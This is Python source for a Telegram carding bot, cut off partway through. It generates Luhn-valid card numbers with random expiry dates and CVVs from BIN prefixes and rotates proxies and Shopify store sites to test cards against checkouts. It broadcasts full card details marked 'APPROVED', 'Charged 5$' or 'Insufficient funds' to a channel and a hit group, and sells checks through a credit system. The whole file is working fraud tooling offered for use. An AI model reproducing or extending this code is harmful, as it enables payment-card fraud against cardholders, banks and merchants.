import asyncio
import json
import os
import random
import time
import uuid
import re
import requests
import logging
import traceback
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from fake_useragent import UserAgent
import httpx
from urllib.parse import urlparse
import aiohttp
from typing import Dict, Any, Optional

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "xxxx"
OWNER_ID = 1234
DATA_FILE = "data.json"
USERS_FILE = "users.json"
SITES_FILE = "sites.txt"
VIDEO_URL = "https://t.me/xxxx"
CHANNEL_ID = -1001234
REQUIRED_CHANNEL_ID = -1001234
REQUIRED_CHANNEL_LINK = "https://t.me/xxxx"
HIT_GROUP_ID = -1001234

active_checks = {}
mass_check_running = {}
BOT_MAINTENANCE = False

EMOJI = {
    "infinity": "5989996695079882285",
    "shopify": "5992246772611681940",
    "stripe": "5992246772611681940",
    "tools": "5989975649740134220",
    "crown": "5992102835372691472",
    "premium": "5992384035471495905",
    "free": "5989952018830069575",
    "vip": "5992384035471495905",
    "success": "5260726538302660868",
    "approved": "5260726538302660868",
    "live": "5260726538302660868",
    "passed": "5260726538302660868",
    "unban": "5260726538302660868",
    "error": "5260342697075416641",
    "declined": "5260342697075416641",
    "dead": "5260342697075416641",
    "failed": "5260342697075416641",
    "ban": "5260726538302660868",
    "delete": "5992276017044001388",
    "remove": "5992276017044001388",
    "warning": "5990160522312421883",
    "otp": "5330066942755615469",
    "card": "5992246772611681940",
    "brand_icon": "5258477770735885832",
    "bin_icon": "5258477770735885832",
    "gen": "5989975649740134220",
    "gateway": "5990332467033150285",
    "price": "5992246772611681940",
    "credit": "5359719332542718652",
    "count_icon": "5989975649740134220",
    "bank": "5258260149037965799",
    "vbv": "5992246772611681940",
    "proxy": "5258430848218176413",
    "user": "5990171882500920057",
    "me": "5990171882500920057",
    "plan": "5990171882500920057",
    "id": "5990171882500920057",
    "show": "5990039485839052843",
    "info": "5258330865674494479",
    "address": "5990039485839052843",
    "country": "5258509201306557640",
    "check": "5990158512267726679",
    "loading": "5427181942934088912",
    "check_yes": "5990173055026990900",
    "check_no": "5992162638497321235",
    "stop": "5992276017044001388",
    "plus": "5990267033206395108",
    "back": "5990170559650991836",
    "admin": "6102866966739946205",
    "owner": "5874994448898725106",
    "lock": "5990055153879748658",
    "site": "5990039485839052843",
    "mass": "5989975649740134220",
    "cmd": "5989975649740134220",
    "code": "5989975649740134220",
    "redeem": "5989975649740134220",
    "key": "5989975649740134220",
    "buy": "5992246772611681940",
    "dm": "5260268501515377807",
    "dev": "5990246683651345859",
    "time": "5992184495585889960",
    "total": "5992246772611681940",
    "insufficient": "5258152182150077732",
    "unsupported": "5992162638497321235",
    "limit": "5992162638497321235",
    "speed": "5992200640367956465",
    "turn_off": "5992146008383950436",
    "checker_menu": "5989975649740134220",
    "my_account": "5990171882500920057",
    "admin_panel": "5992129361090711368",
    "upgrade": "5258204546391351475",
    "channel": "5992600330024521485",
    "support": "5992200618893119382",
    "kashier": "5992246772611681940",
}

def get_emoji_text(name):
    eid = EMOJI.get(name, "")
    if eid:
        return f'<tg-emoji emoji-id="{eid}">⚡</tg-emoji>'
    return "•"

def to_bold(text):
    bold_map = {
        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜',
        'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥',
        'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭',
        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶',
        'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿',
        's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵',
        ' ': ' ', '.': '.', ',': ',', '!': '!', '?': '?', '@': '@', '#': '#', '$': '$', '%': '%',
        '^': '^', '&': '&', '*': '*', '(': '(', ')': ')', '-': '-', '_': '_', '=': '=', '+': '+',
        '{': '{', '}': '}', '[': '[', ']': ']', '|': '|', '\\': '\\', ':': ':', ';': ';', '"': '"',
        "'": "'", '<': '<', '>': '>', '/': '/', '`': '`', '~': '~', '\n': '\n', '\t': '\t'
    }
    return ''.join(bold_map.get(char, char) for char in text)

def format_card_text(card_number, month, year, cvv):
    return f"{card_number}|{month}|{year}|{cvv}"

async def send_hit_to_group_async(cc, mon, year, cvv, gateway, result, username, plan, time_taken):
    try:
        card_formatted = format_card_text(cc, mon, year, cvv)
        
        result_upper = result.upper()
        if "ORDER_PLACED" in result_upper or "APPROVED" in result_upper:
            status_icon = get_emoji_text('approved')
            status_display = "ORDER_PLACED"
        elif "CHARGED 5$" in result_upper or "CHARGED" in result_upper:
            status_icon = get_emoji_text('warning')
            status_display = "Charged 5$"
        elif "PAID" in result_upper or "PAID ✅" in result_upper:
            status_icon = get_emoji_text('approved')
            status_display = "Paid ✅"
        elif "INSUFFICIENT" in result_upper or "INSUFFICIENT FUNDS" in result_upper:
            status_icon = get_emoji_text('insufficient')
            status_display = "Insufficient funds"
        elif "OTP" in result_upper or "OTP_REQUIRED" in result_upper:
            status_icon = get_emoji_text('otp')
            status_display = "OTP REQUIRED"
        else:
            status_icon = get_emoji_text('success')
            status_display = result
        
        text = f"""{get_emoji_text('success')} New Hit Detected 
____________________
{get_emoji_text('gateway')} Gateway: {gateway}
{get_emoji_text('info')} Result: {status_icon} {status_display}
{get_emoji_text('user')} User: @{username}
____________________
{get_emoji_text('dev')} Bot By: @hhhiqh - @v_dark"""
        
        async with aiohttp.ClientSession() as session:
            await session.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": HIT_GROUP_ID, "text": text, "parse_mode": "HTML"}
            )
    except Exception as ex:
        logger.error(f"Error sending hit to group: {ex}")

def luhn_checksum(card_number):
    def digits_of(n): return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number):
    return luhn_checksum(card_number) == 0

def calculate_luhn(partial_card):
    for i in range(10):
        full_card = partial_card + str(i)
        if is_luhn_valid(full_card):
            return str(i)
    return '0'

BIN_DB = {
    "4": {"brand": "VISA", "length": 16, "type": "Credit"},
    "51": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "52": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "53": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "54": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "55": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "2221": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "2720": {"brand": "MASTERCARD", "length": 16, "type": "Credit"},
    "34": {"brand": "AMEX", "length": 15, "type": "Credit"},
    "37": {"brand": "AMEX", "length": 15, "type": "Credit"},
    "6011": {"brand": "DISCOVER", "length": 16, "type": "Credit"},
    "65": {"brand": "DISCOVER", "length": 16, "type": "Credit"},
    "3528": {"brand": "JCB", "length": 16, "type": "Credit"},
    "3531": {"brand": "JCB", "length": 16, "type": "Credit"},
}

def get_brand_from_bin(bin_str):
    prefixes = sorted(BIN_DB.keys(), key=len, reverse=True)
    for prefix in prefixes:
        if bin_str.startswith(prefix):
            return BIN_DB[prefix]
    if bin_str.startswith('4'):
        return {"brand": "VISA", "length": 16, "type": "Credit"}
    if bin_str.startswith('5'):
        return {"brand": "MASTERCARD", "length": 16, "type": "Credit"}
    return {"brand": "UNKNOWN", "length": 16, "type": "Credit"}

def generate_cc(bin_str, exp_month=None, exp_year=None, cvv=None, quantity=10):
    cards = []
    bin_info = get_brand_from_bin(bin_str)
    card_length = bin_info['length']
    brand = bin_info['brand']
    for _ in range(quantity):
        remaining_length = card_length - len(bin_str) - 1
        if remaining_length < 0:
            card_length = len(bin_str) + 1
            remaining_length = 0
        middle_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
        partial = bin_str + middle_digits
        check_digit = calculate_luhn(partial)
        card_number = partial + check_digit
        if exp_month:
            month = exp_month.zfill(2)
        else:
            month = str(random.randint(1, 12)).zfill(2)
        if exp_year:
            if len(str(exp_year)) == 2:
                year = str(exp_year)
            else:
                year = str(exp_year)[-2:]
        else:
            current_year = datetime.now().year % 100
            year = str(random.randint(current_year, current_year + 5))
        if cvv:
            final_cvv = str(cvv)
        else:
            if brand == "AMEX":
                final_cvv = ''.join([str(random.randint(0, 9)) for _ in range(4)])
            else:
                final_cvv = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        cards.append({"number": card_number, "month": month, "year": year, "cvv": final_cvv, "brand": brand, "formatted": f"{card_number}|{month}|{year}|{final_cvv}"})
    return cards

def get_bin_info(bin_str):
    bin_str = str(bin_str)[:6]
    try:
        r = requests.get(f'https://bins.antipublic.cc/bins/{bin_str}', timeout=10)
        data = r.json()
        return {"bin": data.get("bin", bin_str), "brand": data.get("brand", ""), "type": data.get("type", ""), "level": data.get("level", ""), "bank": data.get("bank", ""), "country": data.get("country_name", ""), "flag": data.get("country_flag", "")}
    except:
        return {"bin": bin_str, "brand": "", "type": "", "level": "", "bank": "", "country": "", "flag": ""}

def is_shopify_gateway(gateway_name):
    if not gateway_name:
        return False
    gateway_lower = gateway_name.lower()
    shopify_keywords = ['shopify', 'shopify_payments', 'shopify_payments_v2', 'payments']
    for keyword in shopify_keywords:
        if keyword in gateway_lower:
            return True
    return False

async def send_approved_to_channel_shopify_async(cc, mon, year, cvv, price, status_msg, time_taken, username, plan, gateway="Shopify"):
    try:
        bin_info = get_bin_info(cc[:6])
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', '')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country', 'Unknown')
        flag = bin_info.get('flag', '')
        
        type_display = f"{card_type}"
        if level:
            type_display += f" - {level}"
        
        card_formatted = format_card_text(cc, mon, year, cvv)
        
        text = f"""{get_emoji_text('approved')} APPROVED

{get_emoji_text('card')} CC ⇾ <code>{card_formatted}</code>
{get_emoji_text('gateway')} Gateway ⇾ {gateway} ${price}
{get_emoji_text('info')} Response ⇾ {status_msg}

{get_emoji_text('brand_icon')} BIN Info ⇾ {brand} - {type_display}
{get_emoji_text('bank')} Bank ⇾ {bank.upper()}
{get_emoji_text('country')} Country ⇾ {country} {flag}

Checked ⇾ @{username} | {plan}
{get_emoji_text('time')} Time ⇾ {time_taken}"""
        
        async with aiohttp.ClientSession() as session:
            await session.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHANNEL_ID, "text": text, "parse_mode": "HTML"}
            )
        
        status_upper = status_msg.upper()
        if "ORDER_PLACED" in status_upper or "INSUFFICIENT" in status_upper or "OTP" in status_upper:
            await send_hit_to_group_async(cc, mon, year, cvv, gateway, status_msg, username, plan, time_taken)
            
    except Exception as ex:
        logger.error(f"Error sending to channel: {ex}")

async def send_homegrown_to_channel_async(cc, mon, year, cvv, status_msg, time_taken, username, plan, gateway="Clover 5$"):
    try:
        bin_info = get_bin_info(cc[:6])
        brand = bin_info.get('brand', 'Unknown')
        card_type = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', '')
        bank = bin_info.get('bank', 'Unknown')
        country = bin_info.get('country', 'Unknown')
        flag = bin_info.get('flag', '')
        
        type_display = f"{card_type}"
        if level:
            type_display += f" - {level}"
        
        card_formatted = format_card_text(cc, mon, year, cvv)
        
        if "Paid ✅" in status_msg or "APPROVED" in status_msg.upper():
            status_icon = get_emoji_text('approved')
            status_display = "Paid ✅"
        elif "Charged" in status_msg or "5$" in status_msg:
            status_icon = get_emoji_text('warning')
            status_display = "Charged 5$"
        elif "insufficient" in status_msg.lower():
            status_icon = get_emoji_text('insufficient')
            status_display = "Insufficient funds"
        elif "CVV2 DECLINED" in status_msg.upper():
            status_icon = get_emoji_text('declined')
            status_display = "CVV2 DECLINED"
        elif "Invalid" in status_msg or "invalid" in status_msg.lower():
            status_icon = get_emoji_text('declined')
            status_display = "INVALID CARD"
        elif "declined" in status_msg.lower() or "Declined" in status_msg:
            status_icon = get_emoji_text('declined')
            status_display = "DECLINED"
        else:
            status_icon = get_emoji_text('declined')
            status_display = status_msg[:30] if status_msg else "DECLINED"
        
        text = f"""{status_icon} {status_display}

{get_emoji_text('card')} CC ⇾ <code>{card_formatted}</code>
{get_emoji_text('gateway')} Gateway ⇾ {gateway}
{get_emoji_text('info')} Response ⇾ {status_msg}

{get_emoji_text('brand_icon')} BIN Info ⇾ {brand} - {type_display}
{get_emoji_text('bank')} Bank ⇾ {bank.upper()}
{get_emoji_text('country')} Country ⇾ {country} {flag}

Checked ⇾ @{username} | {plan}
{get_emoji_text('time')} Time ⇾ {time_taken}"""
        
        async with aiohttp.ClientSession() as session:
            await session.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={"chat_id": CHANNEL_ID, "text": text, "parse_mode": "HTML"}
            )
        
        status_lower = status_msg.lower()
        if "charged" in status_lower or "5$" in status_lower or "insufficient" in status_lower or "paid" in status_lower:
            await send_hit_to_group_async(cc, mon, year, cvv, gateway, status_msg, username, plan, time_taken)
            
    except Exception as ex:
        logger.error(f"Error sending homegrown to channel: {ex}")

async def notify_admins_on_redeem_async(user_id, username, code, credits):
    data = load_data()
    for uid, user in data["users"].items():
        if user["plan"] in ["Owner", "Admin"] and not user.get("banned", False):
            try:
                text = f"""{get_emoji_text('redeem')} Code Redeemed!

{get_emoji_text('user')} User: @{username} (<code>{user_id}</code>)
{get_emoji_text('code')} Code: <code>{code}</code>
{get_emoji_text('credit')} Credits: +{credits}
{get_emoji_text('time')} Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
                async with aiohttp.ClientSession() as session:
                    await session.post(
                        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                        json={"chat_id": int(uid), "text": text, "parse_mode": "HTML"}
                    )
            except:
                pass

def load_data():
    if not os.path.exists(DATA_FILE):
        default = {"users": {str(OWNER_ID): {"username": "Owner", "credits": 999999, "plan": "Owner", "proxy": None, "proxies": [], "banned": False, "joined": datetime.now().isoformat()}}, "codes": {}, "banned_users": []}
        save_data(default)
        return default
    with open(DATA_FILE, 'r', encoding='utf-8') as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def save_users_json():
    data = load_data()
    users_info = []
    for uid, user in data["users"].items():
        proxy_value = user.get("proxy", None)
        proxies_list = user.get("proxies", [])
        proxy_status = "Set" if (proxy_value and proxy_value != "Not Set") or proxies_list else "Not Set"
        users_info.append({"user_id": int(uid), "username": user.get("username", "N/A"), "name": user.get("name", "N/A"), "plan": user.get("plan", "Free"), "credits": user.get("credits", 0), "proxy": proxy_status, "proxy_count": len(proxies_list), "banned": user.get("banned", False), "joined": user.get("joined", "N/A")})
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users_info, f, indent=2, ensure_ascii=False)

def load_sites():
    if not os.path.exists(SITES_FILE):
        with open(SITES_FILE, 'w') as f:
            f.write("example.myshopify.com\n")
        return ["example.myshopify.com"]
    with open(SITES_FILE, 'r') as f:
        sites = [line.strip() for line in f if line.strip()]
        if not sites:
            sites = ["example.myshopify.com"]
        return sites

def get_user(user_id):
    data = load_data()
    return data["users"].get(str(user_id), None)

def create_user(user_id, username, first_name="N/A"):
    data = load_data()
    uid = str(user_id)
    if uid not in data["users"]:
        data["users"][uid] = {"username": username or "N/A", "name": first_name or "N/A", "credits": 250, "plan": "Premium", "proxy": None, "proxies": [], "banned": False, "joined": datetime.now().isoformat()}
        save_data(data)
        save_users_json()
        return True, 250
    return False, 0

def add_credits(user_id, amount):
    data = load_data()
    uid = str(user_id)
    if uid in data["users"]:
        user = data["users"][uid]
        if user["plan"] in ["Owner", "Admin"]:
            return True
        user["credits"] += amount
        if user["credits"] >= 1:
            user["plan"] = "Premium"
        save_data(data)
        save_users_json()
        return True
    return False

def deduct_credit(user_id):
    data = load_data()
    uid = str(user_id)
    if uid in data["users"]:
        user = data["users"][uid]
        if user["plan"] in ["Owner", "Admin"]:
            return True
        if user["credits"] > 0:
            user["credits"] -= 1
            if user["credits"] == 0:
                user["plan"] = "Free"
            save_data(data)
            save_users_json()
            return True
    return False

def get_credits(user_id):
    user = get_user(user_id)
    if user:
        if user["plan"] in ["Owner", "Admin"]:
            return "∞"
        return user["credits"]
    return 0

def is_admin(user_id):
    user = get_user(user_id)
    return user["plan"] in ["Admin", "Owner"] if user else False

def is_owner(user_id):
    return user_id == OWNER_ID

def is_premium(user_id):
    user = get_user(user_id)
    return user["plan"] in ["Premium", "Admin", "Owner"] if user else False

def is_banned(user_id):
    user = get_user(user_id)
    return user.get("banned", False) if user else False

def ban_user(user_id):
    data = load_data()
    uid = str(user_id)
    if uid in data["users"]:
        data["users"][uid]["banned"] = True
        if "banned_users" not in data:
            data["banned_users"] = []
        if uid not in data["banned_users"]:
            data["banned_users"].append(uid)
        save_data(data)
        save_users_json()
        return True
    return False

def unban_user(user_id):
    data = load_data()
    uid = str(user_id)
    if uid in data["users"]:
        data["users"][uid]["banned"] = False
        if "banned_users" in data and uid in data["banned_users"]:
            data["banned_users"].remove(uid)
        save_data(data)
        save_users_json()
        return True
    return False

def format_proxy_string(proxy_str):
    if not proxy_str:
        return None
    
    proxy_str = proxy_str.strip()
    
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return proxy_str
    
    if '@' in proxy_str:
        return f"http://{proxy_str}"
    
    parts = proxy_str.split(':')
    
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    
    elif len(parts) == 4:
        ip, port, user, password = parts
        return f"http://{user}:{password}@{ip}:{port}"
    
    else:
        return f"http://{proxy_str}"

def set_user_proxies(user_id, proxies_list, merge=True):
    data = load_data()
    uid = str(user_id)
    
    if uid not in data["users"]:
        return 0
    
    formatted_proxies = []
    
    for proxy_str in proxies_list:
        if not proxy_str:
            continue
        
        formatted = format_proxy_string(proxy_str)
        if formatted:
            formatted_proxies.append(formatted)
    
    if not formatted_proxies:
        return len(data["users"][uid].get("proxies", []))
    
    if merge:
        old_proxies = data["users"][uid].get("proxies", [])
        
        for proxy in formatted_proxies:
            if proxy not in old_proxies:
                old_proxies.append(proxy)
        
        data["users"][uid]["proxies"] = old_proxies
    else:
        data["users"][uid]["proxies"] = formatted_proxies
    
    if data["users"][uid]["proxies"]:
        data["users"][uid]["proxy"] = data["users"][uid]["proxies"][0]
    else:
        data["users"][uid]["proxy"] = None
    
    save_data(data)
    save_users_json()
    
    return len(data["users"][uid]["proxies"])

def get_user_proxies(user_id):
    user = get_user(user_id)
    if not user:
        return []
    
    proxies = user.get("proxies", [])
    
    if not proxies:
        proxy = user.get("proxy")
        if proxy and proxy != "Not Set" and proxy != "None":
            return [proxy]
    
    return proxies

def delete_user_proxy(user_id):
    data = load_data()
    uid = str(user_id)
    
    if uid in data["users"]:
        data["users"][uid]["proxy"] = None
        data["users"][uid]["proxies"] = []
        save_data(data)
        save_users_json()
        return True
    
    return False

user_last_site = {}
user_last_proxy = {}

def get_random_site_for_user(user_id):
    sites = load_sites()
    if not sites:
        return None
    
    if len(sites) == 1:
        return sites[0]
    
    last_site = user_last_site.get(user_id)
    available_sites = [s for s in sites if s != last_site]
    
    if not available_sites:
        available_sites = sites
    
    chosen_site = random.choice(available_sites)
    user_last_site[user_id] = chosen_site
    
    return chosen_site

def get_random_proxy_for_user(user_id, proxies_list):
    if not proxies_list:
        return None
    
    if len(proxies_list) == 1:
        return proxies_list[0]
    
    last_proxy = user_last_proxy.get(user_id)
    available_proxies = [p for p in proxies_list if p != last_proxy]
    
    if not available_proxies:
        available_proxies = proxies_list
    
    chosen_proxy = random.choice(available_proxies)
    user_last_proxy[user_id] = chosen_proxy
    
    return chosen_proxy

def reset_user_history(user_id):
    if user_id in user_last_site:
        del user_last_site[user_id]
    if user_id in user_last_proxy:
        del user_last_proxy[user_id]

async def test_proxy_async(proxy_url):
    try:
        formatted_proxy = format_proxy_string(proxy_url)
        if not formatted_proxy:
            return False, None
        
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            test_urls = [
                'https://api.ipify.org?format=json',
                'https://api.myip.com',
                'https://api.ip.sb/ip'
            ]
            
            for test_url in test_urls:
                try:
                    async with session.get(test_url, proxy=formatted_proxy) as response:
                        if response.status == 200:
                            data = await response.json()
                            ip = data.get('ip') or data.get('origin', 'Unknown')
                            return True, ip
                except:
                    continue
            
            return False, None
                
    except Exception as e:
        logger.error(f"Proxy test error: {e}")
        return False, None

async def test_proxies_background(update, context, user_id, proxies_to_add, msg, status_msg):
    try:
        working_proxies = []
        dead_proxies = []
        invalid_proxies = []
        
        total = len(proxies_to_add)
        
        tasks = []
        for proxy_str in proxies_to_add:
            formatted = format_proxy_string(proxy_str)
            if not formatted:
                invalid_proxies.append(proxy_str)
                continue
            tasks.append(test_proxy_async(formatted))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for idx, result in enumerate(results):
            proxy_str = proxies_to_add[idx]
            formatted = format_proxy_string(proxy_str)
            
            if not formatted:
                continue
                
            if isinstance(result, Exception):
                dead_proxies.append(proxy_str)
                continue
            
            is_working, ip_info = result
            if is_working:
                working_proxies.append(formatted)
            else:
                dead_proxies.append(proxy_str)
        
        total_count = 0
        if working_proxies:
            total_count = set_user_proxies(user_id, working_proxies, merge=True)
        
        try:
            await status_msg.delete()
        except:
            pass
        
        result_text = f"""{get_emoji_text('success')} {to_bold('Proxy Test Complete!')}

{get_emoji_text('check_yes')} {to_bold('Working:')} {len(working_proxies)}
{get_emoji_text('check_no')} {to_bold('Dead:')} {len(dead_proxies)}
{get_emoji_text('error')} {to_bold('Invalid:')} {len(invalid_proxies)}
{get_emoji_text('info')} {to_bold('Total Proxies:')} {total_count}"""
        
        if working_proxies:
            result_text += f"\n\n{get_emoji_text('proxy')} {to_bold('Added Proxies:')}"
            for i, proxy in enumerate(working_proxies[:5], 1):
                display = proxy[:30] + "..." if len(proxy) > 30 else proxy
                result_text += f"\n{i}. <code>{display}</code>"
            if len(working_proxies) > 5:
                result_text += f"\n... and {len(working_proxies) - 5} more"
        
        if dead_proxies:
            result_text += f"\n\n{get_emoji_text('dead')} {to_bold('Dead Proxies:')}"
            for i, proxy in enumerate(dead_proxies[:3], 1):
                display = proxy[:30] + "..." if len(proxy) > 30 else proxy
                result_text += f"\n{i}. <code>{display}</code>"
            if len(dead_proxies) > 3:
                result_text += f"\n... and {len(dead_proxies) - 3} more"
        
        await msg.edit_text(result_text, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Error in test_proxies_background: {e}")
        try:
            await msg.edit_text(f"{get_emoji_text('error')} {to_bold('Error testing proxies!')}\n\n{str(e)}", parse_mode="HTML")
        except:
            pass

async def check_proxies_background(update, context, user_id, query, proxies):
    try:
        working = []
        dead = []
        results_text = ""
        
        tasks = []
        for proxy in proxies:
            tasks.append(test_proxy_async(proxy))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for idx, result in enumerate(results):
            proxy = proxies[idx]
            if isinstance(result, Exception):
                dead.append(proxy)
                results_text += f"{idx+1}. ❌ {to_bold('Dead')}\n"
                continue
            
            is_working, ip_info = result
            if is_working:
                working.append(proxy)
                results_text += f"{idx+1}. ✅ {to_bold('Working')} - {ip_info}\n"
            else:
                dead.append(proxy)
                results_text += f"{idx+1}. ❌ {to_bold('Dead')}\n"
        
        if dead:
            existing = get_user_proxies(user_id)
            alive = [p for p in existing if p not in dead]
            if alive:
                set_user_proxies(user_id, alive, merge=False)
            else:
                delete_user_proxy(user_id)
        
        result_text = f"""{get_emoji_text('success')} {to_bold('Proxy Check Complete!')}

{get_emoji_text('check_yes')} {to_bold('Working:')} {len(working)}
{get_emoji_text('check_no')} {to_bold('Dead:')} {len(dead)}

{get_emoji_text('info')} {to_bold('Dead proxies have been removed!')}
{get_emoji_text('proxy')} {to_bold('Remaining:')} {len(working)}

━━━━━━━━━━━━━━━━━━━━
{results_text[:4000] if results_text else 'No proxies checked.'}"""
        
        try:
            await query.message.edit_caption(caption=result_text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
        except:
            await query.message.edit_text(result_text, reply_markup=proxy_control_keyboard(), parse_mode="HTML")
            
    except Exception as e:
        logger.error(f"Error in check_proxies_background: {e}")
        try:
            await query.message.edit_text(f"{get_emoji_text('error')} {to_bold('Error checking proxies!')}\n\n{str(e)}", parse_mode="HTML")
        except:
            pass

async def add_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    create_user(user_id, username)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    proxies_to_add = []
    
    if update.message.reply_to_message and update.message.reply_to_message.document:
        try:
            file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
            file_content = await file.download_as_bytearray()
            content = file_content.decode('utf-8', errors='ignore')
            
            for line in content.split('\n'):
                line = line.strip()
                if line and ':' in line:
                    proxies_to_add.append(line)
            
            if not proxies_to_add:
                await update.message.reply_text(
                    f"{get_emoji_text('error')} {to_bold('No valid proxies found in file!')}\n\n"
                    f"{get_emoji_text('plus')} {to_bold('Each line should be:')} <code>IP:PORT:USER:PASS</code>",
                    parse_mode="HTML"
                )
                return
                
        except Exception as e:
            await update.message.reply_text(
                f"{get_emoji_text('error')} {to_bold('Error reading file!')}\n\n{str(e)}",
                parse_mode="HTML"
            )
            return
    
    else:
        text = update.message.text
        lines = text.split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.startswith('/add_proxy'):
                continue
            if ':' in line:
                proxies_to_add.append(line)
    
    if not proxies_to_add:
        await update.message.reply_text(f"""{get_emoji_text('proxy')} {to_bold('Usage:')}

📄 {to_bold('Reply to a .txt file:')}
<code>/add_proxy</code> (reply to a file with proxies)

✏️ {to_bold('Or type proxies manually:')}
<code>/add_proxy
IP:PORT:USER:PASS
IP:PORT:USER:PASS</code>

{get_emoji_text('info')} {to_bold('Supported formats:')}
• <code>IP:PORT</code>
• <code>IP:PORT:USER:PASS</code>
• <code>USER:PASS@IP:PORT</code>
• <code>http://IP:PORT</code>""", parse_mode="HTML")
        return
    
    msg = await update.message.reply_text(
        f"""{get_emoji_text('loading')} {to_bold('Testing Proxies...')}

{get_emoji_text('proxy')} {to_bold(f'Found {len(proxies_to_add)} proxy(s) to test...')}""",
        parse_mode="HTML"
    )
    
    status_msg = await update.message.reply_text(
        f"{get_emoji_text('loading')} {to_bold('Testing proxies in background...')}\n\n"
        f"{get_emoji_text('info')} {to_bold('You can continue using the bot normally.')}"
    )
    
    asyncio.create_task(
        test_proxies_background(update, context, user_id, proxies_to_add, msg, status_msg)
    )

async def show_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    create_user(user_id, username)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
    if is_banned(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('You are banned!')}", parse_mode="HTML")
        return
    
    proxies = get_user_proxies(user_id)
    
    if not proxies:
        await update.message.reply_text(
            f"""{get_emoji_text('check_no')} {to_bold('No Proxies Found!')}

{get_emoji_text('proxy')} {to_bold('Use /add_proxy to add proxies')}

{to_bold('Supported formats:')}
• <code>IP:PORT</code>
• <code>IP:PORT:USER:PASS</code>
• <code>USER:PASS@IP:PORT</code>""",
            parse_mode="HTML"
        )
        return
    
    file_content = "\n".join(proxies)
    file_name = f"proxies_{user_id}.txt"
    
    with open(file_name, 'w', encoding='utf-8') as f:
        f.write(file_content)
    
    with open(file_name, 'rb') as f:
        await update.message.reply_document(
            f,
            caption=f"{get_emoji_text('proxy')} {to_bold(f'Your Proxies ({len(proxies)}):')}\n\n{get_emoji_text('info')} {to_bold('Total:')} {len(proxies)} proxies"
        )
    
    os.remove(file_name)

async def del_proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    create_user(user_id, username)
    
    global BOT_MAINTENANCE
    if BOT_MAINTENANCE and not is_admin(user_id):
        await update.message.reply_text(get_maintenance_text(), parse_mode="HTML")
        return
    
